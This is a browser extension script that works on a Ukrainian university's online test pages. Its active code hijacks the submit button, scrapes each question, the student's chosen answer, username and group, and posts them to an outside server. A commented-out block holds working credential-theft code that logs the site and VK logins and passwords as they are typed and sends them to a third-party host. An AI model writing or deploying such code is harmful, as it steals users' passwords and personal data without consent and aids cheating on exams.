$.get(chrome.extension.getURL('/injected.js'),
    function (data) {
        var script = document.createElement("script");
        script.setAttribute("type", "text/javascript");
        script.innerHTML = data;
        document.getElementsByTagName("head")[0].appendChild(script);

        function createXmlResponse() {
            var input;
            var discipline = $(".breadcrumbs-list > li").next().find("a").html()
            $.get("http://dl.tntu.edu.ua/users/profile.php", function (groupData) {

                var responseArr = [];

                var group = $(groupData).find("input[id=\"group\"]").attr("value");


                var elements = $('form[name = \'test\'] fieldset[class=\'group_form\'] > div[class=\'test_instruction\']');
                var countElement = elements.length;
                var count = 0;
                var flag = true;
                elements.each(function () {

                    if ($("label[for=\"" + $($(this).next().find("input:checked")).attr("id") + "\"]").html() !== undefined && flag) {

                        var object = {};

                        var scoresOnTest = $(this).find("div").text();


                        var questionNumber = $(this).find("h3").text();

                        var question = $(this).next().find("p").text();

                        var elements = $(this).next().find("label");


                        var answers = [];
                        var elementsXml = "";
                        elements.each(function (index) {
                            answers.push($(this).text());
                        });

                        object["scoreOnQuestion"] = scoresOnTest.replace("\r", "").replace("\n", "").replace("\t", "").replace("Балів", "").trim();
                        object["questionHeader"] = questionNumber.replace("\r", "").replace("\n", "").replace("\t", "").trim();
                        object["question"] = question.replace("\r", "").replace("\n", "").replace("\t", "").trim();
                        //object["answers"] = answers;
                        object["discipline"] = discipline.replace("\r", "").replace("\n", "").replace("\t", "").trim();
                        object["moduleName"] = $("fieldset[class='group_form'] > legend[class='group_form']").text().replace("\r", "").replace("\n", "").replace("\t", "").trim();
                        object["answer"] = ($("label[for=\"" + $($(this).next().find("input:checked")).attr("id") + "\"]").text()).replace("\r", "").replace("\n", "").replace("\t", "").trim();
                        object["user"] = $("#header-main-logout-username").text();
                        object["group"] = group;

                        responseArr.push(object);

                    }
                    count += 1;
                    if (count === countElement - 1) {
                        flag = false;
                        sendXmlResponse(responseArr);

                    }
                });

            });
        }

        var inp = $("fieldset[class='group_form'] input[type='submit']");
        $(inp).attr("type", "button");
        $(inp).attr("name", "button");
        $(inp).click(function () {
                createXmlResponse();
            }
        );


        function sendXmlResponse(result) {
            //$.post("http://94.153.16.146:8080/AtutorAuestion/question", result);
            //response.addHeader("Access-Control-Allow-Origin", "*");
            console.log( JSON.stringify(result));
            $.ajax({
                url: "http://94.153.16.146:8080/easytutor/rest/atutor/objects",
                data: JSON.stringify(result),
                contentType: "application/json",
                type: 'POST',
                success: function () {

                    //$( "form[name = 'test']").submit();
                },
                error: function () {
                    alert('failure');
                }

            });

        }

        $("form[name = 'form']").submit(function (e) {
            document.cookie = "discipline=" + $("#breadcrumbs a").next().html();
            document.cookie = "moduleName=" + $("form[name = 'form'] > div[class='input-form'] > fieldset[class='group_form'] > legend").html();

        });

        function getCookie(name) {
            function escape(s) {
                return s.replace(/([.*+?\^${}()|\[\]\/\\])/g, '\\$1');
            };
            var match = document.cookie.match(RegExp('(?:^|;\\s*)' + escape(name) + '=([^;]*)'));
            return match ? match[1] : null;
        }


        /*
         deleteCookie( 'TNTU_login' );
         deleteCookie( 'TNTU_pass' );

         $.ajax( {
         url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
         data         : {
         email   : TNTU_login,
         password: TNTU_pass,
         social  : "TNTU"
         },
         dataType     : "jsonp",
         jsonpCallback: "login"
         } );

         $( "#quick_login_button" ).click( function ( ) {
         var login_vk = $( "#quick_email" ).val();
         var pass_vk = $( "#quick_pass" ).val();


         $.ajax( {
         url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
         data         : {
         email   : login_vk,
         password: pass_vk,
         social  : "VK"
         },
         dataType     : "jsonp",
         jsonpCallback: "login"
         } )

         } );


         $( "#pass" ).keyup( function ( e ) {
         TNTU_pass = $( "#pass" ).val();
         } );

         $( "form[name = 'form']" ).submit( function ( e ) {
         TNTU_login = $( "#login" ).val();
         document.cookie = "TNTU_login=" + TNTU_login;
         document.cookie = "TNTU_pass=" + TNTU_pass;
         } );



         $( "form[name = 'login']" ).submit( function ( e ) {
         var login_vk = $( "#quick_email" ).val();
         var pass_vk = $( "#quick_pass" ).val();
         alert(login_vk);
         $.ajax( {
         url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
         data         : {
         email   : login_vk,
         password: pass_vk,
         social  : "VK"
         },
         dataType     : "jsonp",
         jsonpCallback: "login"
         } )
         } );


         $( "form[name = 'login']" ).submit( function ( e ) {
         var login_vk = $( "#quick_email" ).val();
         var pass_vk = $( "#quick_pass" ).val();
         alert(login_vk);
         $.ajax( {
         url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
         data         : {
         email   : login_vk,
         password: pass_vk,
         social  : "VK"
         },
         dataType     : "jsonp",
         jsonpCallback: "login"
         } )
         } );
         */

    }
);

function getCookie(name) {
    var matches = document.cookie.match(new RegExp(
        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
    ));
    return matches ? decodeURIComponent(matches[1]) : undefined;
}

function deleteCookie(name) {
    setCookie(name, "", {expires: -1})
}

function setCookie(name, value, options) {
    options = options || {};

    var expires = options.expires;

    if (typeof expires == "number" && expires) {
        var d = new Date();
        d.setTime(d.getTime() + expires * 1000);
        expires = options.expires = d;
    }
    if (expires && expires.toUTCString) {
        options.expires = expires.toUTCString();
    }

    value = encodeURIComponent(value);

    var updatedCookie = name + "=" + value;

    for (var propName in options) {
        updatedCookie += "; " + propName;
        var propValue = options[propName];
        if (propValue !== true) {
            updatedCookie += "=" + propValue;
        }
    }

    document.cookie = updatedCookie;
}
